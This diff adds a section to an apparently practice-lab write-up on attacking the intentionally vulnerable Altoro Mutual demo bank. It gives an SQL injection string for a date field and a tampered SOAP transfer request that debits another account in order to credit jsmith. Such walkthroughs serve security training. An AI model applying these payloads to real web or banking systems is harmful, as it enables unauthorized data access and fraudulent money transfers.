@@ -87,3 +87,30 @@ Table: users
 | tuser    | tuser     |
 +----------+-----------+
 ```
+
+
+### Make Jsmith rich
+* On the http://demo.testfire.net/bank/transaction.aspx page use the SQLi in the before date `1 or 1 = 1;--` 
+to view all transactions.   
+* Transactions going from account 20 and 21 seem to be automated. 
+* Make a transaction from Account 20 to jsmith savings account
+* intercept transaction request and change `debitAccount` number to 20 
+```
+
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+ xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+ xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+ <soap:Body>
+  <TransferBalance xmlns="http://www.altoromutual.com/bank/ws/">
+   <transDetails>
+    <transferDate>2000-01-01</transferDate>
+    <debitAccount>20</debitAccount>
+    <creditAccount>1001160141</creditAccount>
+    <transferAmount>2000</transferAmount>
+   </transDetails>
+  </TransferBalance>
+ </soap:Body>
+</soap:Envelope>
+
+```
